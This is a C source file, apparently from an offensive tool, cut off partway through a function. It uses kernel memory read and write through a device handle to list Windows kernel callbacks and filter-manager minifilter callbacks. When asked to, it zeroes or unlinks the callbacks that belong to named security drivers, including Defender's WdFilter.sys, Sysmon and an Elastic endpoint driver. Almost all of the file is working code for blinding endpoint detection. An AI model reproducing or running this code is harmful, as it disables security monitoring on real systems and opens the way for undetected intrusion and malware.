#include "common.h"

const char* driverNames[] = {
	"WdFilter.sys", "MsSecFlt.sys", "elastic - endpoint - driver.sys", "SysmonDrv.sys"
};

const int numDrivers = sizeof(driverNames) / sizeof(driverNames[0]);

BOOL GetNtoskrnlBaseAddress(OUT LPVOID *pNtoskrnlBase) {

	BOOL								bSTATE			= TRUE;
	HMODULE								hNTDLL			= NULL; // Stores handle to ntdll.dll
	NTSTATUS							STATUS			= NULL; // Stores the NTSTATUS
	ULONG								uReturn1		= NULL; // Size returned in bytes from NtQuerySystemInformation
	ULONG								uReturn2		= NULL; // Size returned in bytes from NtQuerySystemInformation
	PSYSTEM_MODULE_INFORMATION			pModuleInfo		= NULL; // SYSTEM_MODULE_INFORMATION struct

	// Get handle to ntdll.dll
	// https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
	hNTDLL = LoadLibraryA("ntdll.dll");
	if (!hNTDLL) {
		errorWin32("LoadLibraryA - Failed to get handle to ntdll.dll");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	info_t("LoadLibraryA - Received handle to ntdll.dll 0x%p", hNTDLL);

	// Resolve address of NtQuerySystemInformation
	fnNtQuerySystemInformation NtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(hNTDLL, "NtQuerySystemInformation");
	if (!NtQuerySystemInformation) {
		errorWin32("GetProcAddress - Failed to address of NtQuerySystemInformation");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	info_t("GetProcAddress - Received address to NtQuerySystemInformation 0x%p", NtQuerySystemInformation);

	// Get the size of SYSTEM_MODULE_INFORMATION
	// https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation
	STATUS = NtQuerySystemInformation(
		SystemModuleInformation,		// Returns a SystemModuleInformation stuct
		NULL,							// Can be null the first time calling
		0,								// Can be null the first time calling
		&uReturn1						// Returned size
	);
	info_t("NtQuerySystemInformation - Received %lu bytes of SystemModuleInformation", uReturn1);

	// Allocate memory for SYSTEM_MODULE_INFORMATION
	pModuleInfo = (PSYSTEM_MODULE_INFORMATION)malloc(uReturn1);
	if (!pModuleInfo) {
		error("malloc - Failed to allocate memory");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	info_t("Malloc - Allocated %lu bytes of memory at 0x%p", uReturn1, pModuleInfo);

	// Query the SYSTEM_MODULE_INFORMATION
	// https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation
	STATUS = NtQuerySystemInformation(
		SystemModuleInformation,		// Returns a SystemModuleInformation stuct
		pModuleInfo,					// Pointer to SYSTEM_CODEINTEGRITY_INFORMATION struct
		uReturn1,						// Size of the SYSTEM_CODEINTEGRITY_INFORMATION struct
		&uReturn2						// Returned size
	);
	if (!NT_SUCCESS(STATUS)) {
		errorNT("NtQuerySystemInformation failed", STATUS);
		bSTATE = FALSE;
		goto _cleanUp;
	}
	info_t("NtQuerySystemInformation - Received %lu bytes of SystemModuleInformation saved at 0x%p", uReturn2, pModuleInfo);

	// The first module in the list is typically ntoskrnl.exe
	*pNtoskrnlBase = pModuleInfo->Modules[0].ImageBase;

_cleanUp:

	if (pModuleInfo) {
		free(pModuleInfo);
	}

	return bSTATE;

}

// List and sort all kernel drivers, used to check if kernel callback address is in their address space, outputs a pointer to list of kernel drivers, 8 bytes each.
BOOL ListAndSortKernelDrivers(OUT LPVOID* ppDrivers, OUT DWORD* pdwDriverCount) {
	
	BOOL	bSTATE						= TRUE;
	LPVOID* pDrivers					= NULL;     // Allocated buffer to hold driver base addresses
	DWORD	cbNeeded					= 0;        // Bytes needed to hold driver list
	DWORD	dwCount						= 0;        // Number of drivers found
	LPVOID	lpTemp						= NULL;     // Temporary pointer for sorting
	CHAR	szDriverName[MAX_PATH]		= { 0 };    // Buffer for driver names

	// Query the required size
	if (!EnumDeviceDrivers(NULL, 0, &cbNeeded)) {
		error("EnumDeviceDrivers - Failed to query required buffer size");
		bSTATE = FALSE;
		goto _cleanUp;
	}

	// Allocate required memory
	pDrivers = (LPVOID*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbNeeded);
	if (!pDrivers) {
		error("HeapAlloc - Failed to allocate memory for driver list");
		bSTATE = FALSE;
		goto _cleanUp;
	}

	// Retrieve driver list
	if (!EnumDeviceDrivers(pDrivers, cbNeeded, &cbNeeded)) {
		error("EnumDeviceDrivers - Failed to enumerate drivers");
		bSTATE = FALSE;
		goto _cleanUp;
	}

	dwCount = cbNeeded / sizeof(LPVOID);

	// Detect kernel drivers addresses and sort the list
	for (DWORD i = 0; i < dwCount; i++) {
		GetDeviceDriverBaseNameA(pDrivers[i], szDriverName, sizeof(szDriverName));
		BYTE bFirstByte = ((DWORD64)(pDrivers[i]) >> 56);
		if (bFirstByte == 0xFF) {
			//info_t("\tDriver[%lu] Base: 0x%p Name: %s", i, pDrivers[i], szDriverName);
			for (DWORD j = 0; j < dwCount - 1; j++) {
				for (DWORD k = j + 1; k < dwCount; k++) {
					if (pDrivers[j] > pDrivers[k]) {
						lpTemp = pDrivers[j];
						pDrivers[j] = pDrivers[k];
						pDrivers[k] = lpTemp;
					}
				}
			}
		}
	}

	//info_t("\nPrinting memory ranges for each kernel driver");
	//// Print loaded driver memory ranges
	//for (DWORD i = 0; i < dwCount - 1; i++) {
	//	DWORD64 dwStartAddr = (DWORD64)pDrivers[i];       // Start address of current driver
	//	DWORD64 dwEndAddr = (DWORD64)pDrivers[i + 1];   // Start address of next driver (marks end of current)
	//
	//	// https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getdevicedriverbasenamea
	//	CHAR szDriverName[MAX_PATH] = { 0 };
	//	GetDeviceDriverBaseNameA((LPVOID)dwStartAddr, szDriverName, sizeof(szDriverName));
	//
	//	info_t("\tDriver %03d: %-25s 0x%016llx - 0x%016llx", i, szDriverName, dwStartAddr, dwEndAddr);
	//}

	*ppDrivers = pDrivers;
	*pdwDriverCount = dwCount;

_cleanUp:

	if (!bSTATE && pDrivers) {
		HeapFree(GetProcessHeap(), 0, pDrivers);
	}

	return bSTATE;
}

// Checks whether a given driver name matches a known EDR-related driver
BOOL isDriverListed(IN LPSTR lpstrDriverName) {

	BOOL bSTATE = FALSE;

	for (int i = 0; i < numDrivers; i++) {
		
		// Case-insensitive string comparison
		// https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/stricmp-stricmp-l-wcsicmp-wcsicmp-l?view=msvc-170
		if (_stricmp(driverNames[i], lpstrDriverName) == 0) {
			bSTATE = TRUE;
			break;
		}
	}

	return bSTATE;
}

// List or remove kernel callback arrays, used for process, thread and image kernel callbacks
BOOL ListOrRemoveKCArray(IN HANDLE hDevice, IN LPSTR lpstrCallbackType, IN DWORD64 callbackArrayAddress, IN LPVOID pDrivers, IN DWORD dwDriverCount, IN BOOL bRemove) {

	BOOL	bSTATE					= TRUE;
	HANDLE	hOutput					= NULL;		// Handle to standard output
	PVOID*	lpDrivers				= NULL;		// Pointer to loaded driver base addresses
	DWORD64	dwNextAddr				= 0;		// Current callback address
	DWORD64	dwCallbackPtr			= 0;		// Raw pointer read from callback array
	DWORD64	dwCallbackAligned		= 0;		// Aligned pointer to EX_CALLBACK_ROUTINE_BLOCK
	DWORD64	dwCallbackFunc			= 0;		// Actual function pointer inside the structure
	CHAR	szDeviceName[MAX_PATH]	= { 0 };	// Buffer to hold driver base name
	DWORD64	dwDriverBase			= 0;		// Base address of current driver

	// Get handle to standard output
	// https://learn.microsoft.com/en-us/windows/console/getstdhandle
	hOutput = GetStdHandle(STD_OUTPUT_HANDLE);

	if (bRemove) {
		info_t("---------- Listing and removing %s Kernel Callbacks ----------", lpstrCallbackType);
	}
	else {
		info_t("---------- Listing %s Kernel Callbacks ----------", lpstrCallbackType);
	}

	// Assign input driver pointer
	lpDrivers = (PVOID*)pDrivers;

	// Iterate over the callback array
	for (BYTE i = 0; i < PSP_MAX_CALLBACKS; i++) {

		// Calc the address of the next callback pointer
		dwNextAddr = callbackArrayAddress + i * 0x8;

		// Read the pointer from the callback array
		dwCallbackPtr = ReadMemoryDWORD64(hDevice, dwNextAddr);

		// If pointer is null, then skip
		if (dwCallbackPtr == 0) {
			//info_t("Slot %02d - Empty (NULL)", i);
			continue;
		}

		// Allign the pointer
		dwCallbackAligned = ((dwCallbackPtr >> 4) << 4);

		// Read the function pointer from the offset +0x8
		dwCallbackFunc = ReadMemoryDWORD64(hDevice, dwCallbackAligned + 0x8);

		// Match against known EDR driver names
		for (DWORD j = 0; j < dwDriverCount - 1; j++) {

			dwDriverBase = (DWORD64)lpDrivers[j];

			// Check if function pointer is located within the address range of a known driver module
			// Curent driver vs next driver
			if (dwCallbackFunc > dwDriverBase && dwCallbackFunc < (DWORD64)lpDrivers[j + 1]) {

				// https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getdevicedriverbasenamea
				GetDeviceDriverBaseNameA((LPVOID)dwDriverBase, szDeviceName, sizeof(szDeviceName));

				if (isDriverListed(szDeviceName)) {
					// If its EDR driver make it red
					SetConsoleTextAttribute(hOutput, FOREGROUND_RED);

					// Remove (nullify) the callback pointer if remove is selected
					if (bRemove == TRUE) {
						WriteMemoryDWORD64(hDevice, dwNextAddr, 0x0000000000000000);
					}
				}

				info_t("[%llx]: %llx -> [%s + %llx]", dwNextAddr, dwCallbackFunc, szDeviceName, dwCallbackFunc - dwDriverBase);

				// Reset the color
				SetConsoleTextAttribute(hOutput, 7);

				break;
			}
		}
	}

	if (bRemove == TRUE) {
		info_t("---------- %s Kernel Callbacks of EDR's zeroed out ----------", lpstrCallbackType);
	}

	return bSTATE;

}

// List or remove kernel callback double linked list, used for registry
BOOL ListOrRemoveKCRegistryOperations(IN HANDLE hDevice, IN LPSTR lpstrCallbackType, IN DWORD64 dwCallbackListHead, IN LPVOID pDrivers, IN DWORD dwDriverCount, IN BOOL bRemove) {

	BOOL		bSTATE					= TRUE;
	HANDLE		hOutput					= NULL;		// Handle to standard output
	PVOID*		lpDrivers				= NULL;		// Pointer to loaded driver base addresses
	DWORD64		dwCurrentEntry			= 0;		// Enumerated entry in the double linked list
	DWORD64		dwCallbackFunc			= 0;		// Operation registry callback pointer
	CHAR		szDeviceName[MAX_PATH]	= { 0 };	// Driver base name buffer
	DWORD64		dwDriverBase			= 0;		// Base address of currently matched driver

	// https://learn.microsoft.com/en-us/windows/console/getstdhandle
	hOutput = GetStdHandle(STD_OUTPUT_HANDLE);

	if (bRemove) {
		info_t("---------- Listing and removing %s Kernel Callbacks ----------", lpstrCallbackType);
	}
	else {
		info_t("---------- Listing %s Kernel Callbacks ----------", lpstrCallbackType);
	}

	lpDrivers = (PVOID*)pDrivers;

	// Read the FLINK from the head
	dwCurrentEntry = ReadMemoryDWORD64(hDevice, dwCallbackListHead);

	while (dwCurrentEntry != dwCallbackListHead && dwCurrentEntry != 0) {

		// Read callback pointer
		dwCallbackFunc = ReadMemoryDWORD64(hDevice, dwCurrentEntry + 0x28); // Operation callback

		// Match PRE and POST callback to known drivers
		for (DWORD j = 0; j < dwDriverCount - 1; j++) {

			dwDriverBase = (DWORD64)lpDrivers[j];

			// Check if PRE callback lies within known driver memory range
			if (dwCallbackFunc > dwDriverBase && dwCallbackFunc < (DWORD64)lpDrivers[j + 1]) {
				
				// https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getdevicedriverbasenamea
				GetDeviceDriverBaseNameA((LPVOID)dwDriverBase, szDeviceName, sizeof(szDeviceName));
				
				if (isDriverListed(szDeviceName)) {
					SetConsoleTextAttribute(hOutput, FOREGROUND_RED);
					
					// Cant overwrite these values due to patchguard
					//if (bRemove == TRUE) {
					//	WriteMemoryDWORD64(hDevice, dwCurrentEntry + 0x20, 0x0000000000000000);
					//}
				}
				
				info_t("[%llx]: %llx -> [%s + %llx]", dwCurrentEntry, dwCallbackFunc, szDeviceName, dwCallbackFunc - dwDriverBase);
				SetConsoleTextAttribute(hOutput, 7);
				break;
			}
		}

		// Move to next LIST_ENTRY
		dwCurrentEntry = ReadMemoryDWORD64(hDevice, dwCurrentEntry);
	}

	// Make the flink and blink point to dwCallbackListHead (itself)
	if (bRemove == TRUE) {

		// Flink
		WriteMemoryDWORD64(hDevice, dwCallbackListHead, dwCallbackListHead);

		// Blink
		WriteMemoryDWORD64(hDevice, dwCallbackListHead + 0x8, dwCallbackListHead);

		info_t("---------- %s Kernel Callbacks delinked list ----------", lpstrCallbackType);

	}

	return bSTATE;
}

// List or remove kernel callback double linked list, used for object operations
BOOL ListOrRemoveKCObjectOperations(IN HANDLE hDevice, IN LPSTR lpstrCallbackType, IN DWORD64 dwAddress, IN LPVOID pDrivers, IN DWORD dwDriverCount, IN BOOL bRemove) {

	BOOL		bSTATE						= TRUE;
	HANDLE		hOutput						= NULL;		// Handle to standard output
	PVOID*		lpDrivers					= NULL;		// Pointer to loaded driver base addresses
	DWORD64		dwObjectType				= 0;		// Pointer to the object type
	DWORD64		dwListHead					= 0;		// Stores the listhead
	DWORD64		dwCurrentEntry				= 0;		// Enumerated entry in the double linked list
	DWORD64		dwPreCallbackFunc			= 0;		// Pre-operation registry callback pointer
	DWORD64		dwPostCallbackFunc			= 0;		// Post-operation registry callback pointer
	CHAR		szDeviceName[MAX_PATH]		= { 0 };	// Driver base name buffer
	DWORD64		dwDriverBase				= 0;		// Base address of currently matched driver
	BOOL		bPreMatched					= FALSE;	// Matched PRE callback with a known driver
	BOOL		bPostMatched				= FALSE;	// Matched POST callback with a known driver

	// https://learn.microsoft.com/en-us/windows/console/getstdhandle
	hOutput = GetStdHandle(STD_OUTPUT_HANDLE);

	if (bRemove) {
		info_t("---------- Listing and removing %s Kernel Callbacks ----------", lpstrCallbackType);
	}
	else {
		info_t("---------- Listing %s Kernel Callbacks ----------", lpstrCallbackType);
	}

	lpDrivers = (PVOID*)pDrivers;

	// Read memory at PsProcessType (or thread)
	dwObjectType = ReadMemoryDWORD64(hDevice, dwAddress);

	// Address of the actual list head
	dwListHead = dwObjectType + g_ntoskrnlOffsets.st.object_type_callbacklist;

	// Read the FLINK from the head
	dwCurrentEntry = ReadMemoryDWORD64(hDevice, dwListHead);
	
	while (dwCurrentEntry != dwListHead && dwCurrentEntry != 0) {
	
		// Read both callback function pointers (0x28 and 0x30 for W11) Might be 0x20 and 0x28 for older versions
		dwPreCallbackFunc = ReadMemoryDWORD64(hDevice, dwCurrentEntry + 0x28); // Pre-operation callback
		dwPostCallbackFunc = ReadMemoryDWORD64(hDevice, dwCurrentEntry + 0x30); // Post-operation callback
	
		info_t("Callback Entry %llx", dwCurrentEntry);
	
		// Reset matched flags
		bPreMatched = FALSE;
		bPostMatched = FALSE;
	
		// Match PRE and POST callback to known drivers
		for (DWORD j = 0; j < dwDriverCount - 1; j++) {
	
			dwDriverBase = (DWORD64)lpDrivers[j];
	
			// Check if PRE callback lies within known driver memory range
			if (dwPreCallbackFunc > dwDriverBase && dwPreCallbackFunc < (DWORD64)lpDrivers[j + 1]) {
	
				// https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getdevicedriverbasenamea
				GetDeviceDriverBaseNameA((LPVOID)dwDriverBase, szDeviceName, sizeof(szDeviceName));
	
				if (isDriverListed(szDeviceName)) {
					SetConsoleTextAttribute(hOutput, FOREGROUND_RED);
	
					// Cant overwrite these values due to patchguard
					//if (bRemove == TRUE) {
					//	WriteMemoryDWORD64(hDevice, dwCurrentEntry + 0x20, 0x0000000000000000);
					//}
				}
	
				info_t("\t[PRE] %llx -> [%s + %llx]", dwPreCallbackFunc, szDeviceName, dwPreCallbackFunc - dwDriverBase);
				SetConsoleTextAttribute(hOutput, 7);
				bPreMatched = TRUE;
				break;
			}
		}
	
		// Print unresolved PRE if not in known kernel module
		if (!bPreMatched) {
			info_t("\t[PRE] %llx", dwPreCallbackFunc);
		}
	
		for (DWORD j = 0; j < dwDriverCount - 1; j++) {
	
			dwDriverBase = (DWORD64)lpDrivers[j];
	
			// Check if POST callback lies within known driver memory range
			if (dwPostCallbackFunc > dwDriverBase && dwPostCallbackFunc < (DWORD64)lpDrivers[j + 1]) {
	
				// https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getdevicedriverbasenamea
				GetDeviceDriverBaseNameA((LPVOID)dwDriverBase, szDeviceName, sizeof(szDeviceName));
	
				if (isDriverListed(szDeviceName)) {
					SetConsoleTextAttribute(hOutput, FOREGROUND_RED);
	
					// Cant overwrite these values due to patchguard
					//if (bRemove == TRUE) {
						//WriteMemoryDWORD64(hDevice, dwCurrentEntry + 0x28, 0x0000000000000000);
					//}
				}
	
				info_t("\t[POST] %llx -> [%s + %llx]", dwPostCallbackFunc, szDeviceName, dwPostCallbackFunc - dwDriverBase);
				SetConsoleTextAttribute(hOutput, 7);
				bPostMatched = TRUE;
				break;
			}
		}
	
		// Print unresolved POST if not in known kernel module
		if (!bPostMatched) {
			info_t("\t[POST] %llx", dwPostCallbackFunc);
		}
	
		// Move to next LIST_ENTRY
		dwCurrentEntry = ReadMemoryDWORD64(hDevice, dwCurrentEntry);
	}
	
	// Make the flink and blink point to dwListHead (itself)
	if (bRemove == TRUE) {
	
		// Flink
		WriteMemoryDWORD64(hDevice, dwListHead, dwListHead);
	
		// Blink
		WriteMemoryDWORD64(hDevice, dwListHead + 0x8, dwListHead);

		info_t("---------- %s Kernel Callbacks delinked list ----------", lpstrCallbackType);
	}

	return bSTATE;
}

// List or remove kernel callback double linked list, used for object operations
BOOL ListOrRemoveMiniFiltersCallbacks(IN HANDLE hDevice, IN LPSTR lpstrCallbackType, IN DWORD64 dwAddress, IN LPVOID pDrivers, IN DWORD dwDriverCount, IN BOOL bRemove) {

	BOOL		bSTATE						= TRUE;
	HANDLE		hOutput						= NULL;		// Handle to standard output
	PVOID*		lpDrivers					= NULL;		// Pointer to loaded driver base addresses

	CHAR		szDeviceName[MAX_PATH]		= { 0 };	// Driver base name buffer
	DWORD64		dwDriverBase				 = 0;		// Base address of currently matched driver

	// https://learn.microsoft.com/en-us/windows/console/getstdhandle
	hOutput = GetStdHandle(STD_OUTPUT_HANDLE);

	if (bRemove) {
		info_t("---------- Listing and removing %s Kernel Callbacks ----------", lpstrCallbackType);
	}
	else {
		info_t("---------- Listing %s Kernel Callbacks ----------", lpstrCallbackType);
	}

	lpDrivers = (PVOID*)pDrivers;

	// Address of the FrameList LIST_ENTRY (rList) inside _FLT_RESOURCE_LIST_HEAD (FrameList) in the _GLOBALS struct
	// x fltmgr!FltGlobals
	// dt fltmgr!_GLOBALS fffff807`65c6d7c0
	//		   +0x058 FrameList        : _FLT_RESOURCE_LIST_HEAD
	// dt fltmgr!_FLT_RESOURCE_LIST_HEAD fffff807`65c6d7c0+0x058
	//		   +0x068 rList            : _LIST_ENTRY [ 0xffffca04`cd54e018 - 0xffffca04`cd54e018 ]
	// dt fltmgr!_LIST_ENTRY fffff807`65c6d7c0+0x058+0x68
	//			+0x000 Flink            : 0xffffca04`cd54e018 _LIST_ENTRY[0xfffff807`65c6d880 - 0xfffff807`65c6d880]
	DWORD64 dwFrameListHead = dwAddress + g_fltMgrOffsets.st._GLOBALS_FrameList + g_fltMgrOffsets.st._FLT_RESOURCE_LIST_HEAD_rList;
	//printf("[DEBUG] dwFrameListHead %llx\n", dwFrameListHead);

	// Read the flink from the head
	// dps 0xfffff807`65c6d880 L1
	//			fffff807`65c6d880  ffffca04`cd54e018
	DWORD64 dwCurrentFrameEntry = ReadMemoryDWORD64(hDevice, dwFrameListHead);
	//printf("[DEBUG] dwCurrentFrameEntry %llx\n", dwCurrentFrameEntry);

	// Loop over all instances (disks)
	while (dwCurrentFrameEntry != dwFrameListHead && dwCurrentFrameEntry != 0) {

		// Get the base address of the current frame 
		// dt fltmgr!_FLTP_FRAME Links
		//    +0x008 Links : _LIST_ENTRY
		// dt fltmgr!_FLTP_FRAME ffffca04`cd54e018-0x008
		DWORD64 dwCurrentFrameBase = dwCurrentFrameEntry - g_fltMgrOffsets.st._FLTP_FRAME_Links;
		info_t("\t_FLTP_FRAME: %016llx", dwCurrentFrameBase);
		
		// Enumerate the filters in this frame
		// dt fltmgr!_FLTP_FRAME ffffca04`cd54e018-0x008
		//		+0x048 RegisteredFilters : _FLT_RESOURCE_LIST_HEAD
		// dt fltmgr!_FLT_RESOURCE_LIST_HEAD ffffca04`cd54e018-0x008+0x048
		//		+0x068 rList            : _LIST_ENTRY [ 0xffffca04`d269d020 - 0xffffca04`cd55e8b0 ]
		DWORD64 dwFilterListHead = dwCurrentFrameBase + g_fltMgrOffsets.st._FLTP_FRAME_RegisteredFilters + g_fltMgrOffsets.st._FLT_RESOURCE_LIST_HEAD_rList;
		//printf("[DEBUG] dwFilterListHead %llx\n", dwFilterListHead);

		// Read the flink from the head
		// dps ffffca04`cd54e018-0x008+0x048+0x068 L1
		//		fffca04`cd54e0c0  ffffca04`d269d020
		DWORD64 dwCurrentFilterEntry = ReadMemoryDWORD64(hDevice, dwFilterListHead);
		//printf("[DEBUG] dwCurrentFilterEntry %llx\n", dwCurrentFilterEntry);

		// Loop over all the filters
		while (dwCurrentFilterEntry != dwFilterListHead && dwCurrentFilterEntry != 0) {		

			// Get the current filter base address
			// dt fltmgr!_FLT_OBJECT PrimaryLink
			//		+ 0x010 PrimaryLink : _LIST_ENTRY
			// dt fltmgr!_FLT_FILTER ffffca04`d269d020-0x010
			DWORD64 dwCurrentFilterBase = dwCurrentFilterEntry - g_fltMgrOffsets.st._FLT_OBJECT_PrimaryLink;
			//printf("[DEBUG] dwCurrentFilterBase %llx\n", dwCurrentFilterBase);

			// _FLT_FILTER->DriverObject and DriverInit
			// dt fltmgr!_FLT_FILTER ffffca04`d269d020-0x010
			//		+0x068 DriverObject     : 0xffffca04`d0a74c70 _DRIVER_OBJECT
			// dps ffffca04`d269d020-0x010+0x068 L1
			//		ffffca04`d269d078  ffffca04`d0a74c70
			DWORD64 dwDriverObject = ReadMemoryDWORD64(hDevice, dwCurrentFilterBase + g_fltMgrOffsets.st._FLT_FILTER_DriverObject);
			//printf("[DEBUG] dwDriverObject %llx\n", dwDriverObject);

			// dt fltmgr!_DRIVER_OBJECT DriverInit
			//		+0x058 DriverInit : Ptr64     long 
			// dt fltmgr!_DRIVER_OBJECT ffffca04`d0a74c70+0x058
			// dps ffffca04`d0a74c70+0x058 L1
			DWORD64 dwDriverInit = ReadMemoryDWORD64(hDevice, dwDriverObject + g_fltMgrOffsets.st._DRIVER_OBJECT_DriverInit);
			//printf("[DEBUG] dwDriverInit %llx\n", dwDriverInit);

			BOOL bEDRDriver = FALSE;

			for (DWORD j = 0; j < dwDriverCount - 1; j++) {

				dwDriverBase = (DWORD64)lpDrivers[j];

				// Check if dwDriverInit lies within known driver memory range
				if (dwDriverInit > dwDriverBase && dwDriverInit < (DWORD64)lpDrivers[j + 1]) {

					// https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getdevicedriverbasenamea
					GetDeviceDriverBaseNameA((LPVOID)dwDriverBase, szDeviceName, sizeof(szDeviceName));

					if (isDriverListed(szDeviceName)) {
						SetConsoleTextAttribute(hOutput, FOREGROUND_RED);
						bEDRDriver = TRUE;
					}

					info_t("\t\t_FLT_FILTER: %016llx [%s + 0x%llx]", dwCurrentFilterBase, szDeviceName, dwDriverInit - dwDriverBase);
					SetConsoleTextAttribute(hOutput, 7);
					break;
				}
			}

			// If the driver is EDR related enumerate all the instances
			if(bEDRDriver == TRUE) {

				// Enumerate the instances in this filter
				// dt fltmgr!_FLT_FILTER InstanceList
				//		+0x070 InstanceList : _FLT_RESOURCE_LIST_HEAD
				// dt fltmgr!_FLT_RESOURCE_LIST_HEAD rList
				//		+0x068 rList : _LIST_ENTRY
				DWORD64 dwInstanceListHead = dwCurrentFilterBase + g_fltMgrOffsets.st._FLT_FILTER_InstanceList + g_fltMgrOffsets.st._FLT_RESOURCE_LIST_HEAD_rList;
				//printf("[DEBUG] dwInstanceListHead %llx\n", dwInstanceListHead);

				// Get the current entry
				// dps ffffca04cd56a560+0x070+0x068 L1
				//		ffffca04`cd56a638  ffffca04`cd842918
				DWORD64 dwCurrentInstanceEntry = ReadMemoryDWORD64(hDevice, dwInstanceListHead);
				//printf("[DEBUG] dwCurrentInstanceEntry %llx\n", dwCurrentInstanceEntry);

				// Loop over all the instances
				while (dwCurrentInstanceEntry != dwInstanceListHead && dwCurrentInstanceEntry != 0) {

					// Get the current instance base
					// dt fltmgr!_FLT_INSTANCE Filterlink
					//		+0x078 FilterLink : _LIST_ENTRY
					// ffffca04`cd842918 - 0x078 = ffffca04cd8428a0
					DWORD64 dwCurrentInstanceBase = dwCurrentInstanceEntry - g_fltMgrOffsets.st._FLT_INSTANCE_FilterLink;
					info_t("\t\t\t_FLT_INSTANCE: %016llx", dwCurrentInstanceBase);

					// Get the callback nodes
					// dt fltmgr!_FLT_INSTANCE CallbackNodes
					//		+0x130 CallbackNodes : [50] Ptr64 _CALLBACK_NODE
					// ffffca04cd8428a0 + 0x130 = ffffca04cd8429d0
					DWORD64 dwCallbackNodesArray = dwCurrentInstanceBase + g_fltMgrOffsets.st._FLT_INSTANCE_CallbackNodes;
					//printf("[DEBUG] dwCallbackNodesArray %llx\n", dwCallbackNodesArray);

					DWORD dwNodesFound = 0;

					for (int k = 0; k < 50; k++) {
						
						// Read the callbacknode pointer
						DWORD64 dwCallbackNode = ReadMemoryDWORD64(hDevice, dwCallbackNodesArray + (k * sizeof(PVOID)));
						
						if (dwCallbackNode == 0) {
							continue;
						}	

						// Heuristic: ensure this node is still linked (sanity check)
						// Blink->Flink == this && Flink->Blink == this
						DWORD64 dwPrev = ReadMemoryDWORD64(hDevice, dwCallbackNode + offsetof(LIST_ENTRY, Blink));
						DWORD64 dwPrevNext = (dwPrev ? ReadMemoryDWORD64(hDevice, dwPrev + offsetof(LIST_ENTRY, Flink)) : 0);
						DWORD64 dwNext = ReadMemoryDWORD64(hDevice, dwCallbackNode + offsetof(LIST_ENTRY, Flink));
						DWORD64 dwNextPrev = (dwNext ? ReadMemoryDWORD64(hDevice, dwNext + offsetof(LIST_ENTRY, Blink)) : 0);

						if (dwPrevNext != dwCallbackNode && dwNextPrev != dwCallbackNode) {
							info_t("\t\t\t\tCallbackNodes unlinked");
							continue; // looks unlinked; skip noisy artifacts
						}

						if (bRemove == TRUE) {

							// Change the Flink and Blink
							WriteMemoryDWORD64(hDevice, dwPrev + offsetof(LIST_ENTRY, Flink), dwNext);
							WriteMemoryDWORD64(hDevice, dwNext + offsetof(LIST_ENTRY, Blink), dwPrev);

						}

						dwNodesFound++;
					}

					if (dwNodesFound == 0) {
						info_t("\t\t\t\tCallbackNodes not found");
					}	
					else if (dwNodesFound != 0 && bRemove == TRUE) {
						info_t("\t\t\t\tCallbackNodes: %d found and delinked", dwNodesFound);
					}
					else {
						info_t("\t\t\t\tCallbackNodes: %d found", dwNodesFound);
					}

					// Move to the next LIST_ENTRY of instances
					dwCurrentInstanceEntry = ReadMemoryDWORD64(hDevice, dwCurrentInstanceEntry);

				}
			} // END of if EDR statement
		
			// Move to next LIST_ENTRY of filters
			dwCurrentFilterEntry = ReadMemoryDWORD64(hDevice, dwCurrentFilterEntry);
		}

		// Move to next LIST_ENTRY of frames
		dwCurrentFrameEntry = ReadMemoryDWORD64(hDevice, dwCurrentFrameEntry);
	}

	if (bRemove == TRUE) {
		info_t("---------- %s Kernel Callbacks delinked CallbackNodes list ----------", lpstrCallbackType);
	}

	return bSTATE;

}

// Lists and or removes all kernel callbacks
BOOL ListOrRemoveKernelCallbacks(IN BOOL bRemove) {

	BOOL		bSTATE									= TRUE;
	DWORD64		dwNtoskrnlBaseAddress					= 0;	// Stores base address of ntoskrnl.exe
	DWORD64		dwfltMgrBaseAddress						= 0;	// Stores base address of fltMgr.sys
	HANDLE		hDevice									= NULL; // Saves handle to the device driver
	DWORD64		dwPspCreateProcessNotifyRoutineArray	= 0;	// Base address of PspCreateProcessNotifyRoutineArray
	DWORD64		dwPspCreateThreadNotifyRoutineArray		= 0;	// Base address of dwPspCreateThreadNotifyRoutineArray	
	DWORD64		dwPspLoadImageNotifyRoutineArray		= 0;	// Base address of dwPspLoadImageNotifyRoutineArray
	DWORD64		dwCallbackListHead						= 0;	// Base address of dwCallbackListHead
	DWORD64		dwPsProcessType							= 0;	// Base address of dwPsProcessType
	DWORD64		dwPsThreadType							= 0;	// Base address of dwPsThreadType
	DWORD64		dwFltGlobals							= 0;	// Base address of FltGlobals
	LPVOID		pDrivers								= NULL;	// Output buffer with sorted drivers
	DWORD		dwDriverCount							= 0;    // Driver count

	// Get base address of ntoskrnl.exe
	if (!GetNtoskrnlBaseAddress(&dwNtoskrnlBaseAddress)){
		error("GetNtoskrnlBaseAddress - Failed to get base address of \"ntoskrnl.exe\"");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	info_t("GetNtoskrnlBaseAddress - ntoskrnl address:      %llx", dwNtoskrnlBaseAddress);

	// Get base address of sysMgtr.sys
	dwfltMgrBaseAddress = GetfltMgrBaseAddress();
	if (!dwfltMgrBaseAddress) {
		error("FindfltMgrBaseAddress - Failed to get base address of \"ci.dll\"");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	info_t("FindfltMgrBaseAddress - fltMgr.sys base address: 0x%p", dwfltMgrBaseAddress);

	// Calculate addresses and offsets
	dwPspCreateProcessNotifyRoutineArray	= dwNtoskrnlBaseAddress + g_ntoskrnlOffsets.st.pspCreateProcessNotifyRoutine;
	dwPspCreateThreadNotifyRoutineArray		= dwNtoskrnlBaseAddress + g_ntoskrnlOffsets.st.pspCreateThreadNotifyRoutine;
